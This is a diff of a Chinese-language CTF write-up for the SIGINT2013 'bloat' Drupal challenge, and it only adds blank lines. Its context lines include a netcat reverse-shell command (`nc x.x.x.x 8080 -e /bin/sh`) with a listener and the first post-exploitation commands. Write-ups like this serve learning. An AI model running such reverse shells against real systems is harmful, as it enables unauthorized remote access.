@@ -16,6 +16,7 @@ Description
     Somehow it looks diff-erent o_O:
 
 [cdd-7.20.tar_0.gz](https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/cdd-7.20.tar_0.gz)
+
 [source_code.tar.bz2](https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/source_code.tar.bz2)
 
 这道题比赛的时候只有一个队伍做出来。虽然只有200分，但过程比较复杂。
@@ -121,6 +122,7 @@ drupal_map_assoc()返回的是数组，所以在redirect过程中会被强转成
 幸运的是服务起的nc有-e选项，正好可以交互，不然还得一次一次地执行命令。
 
 用`93802@nc x.x.x.x 8080 -e /bin/sh`反弹，本地用`nc -l 8080`监听。
+
     pwd
     /var/www
     ls -la ./
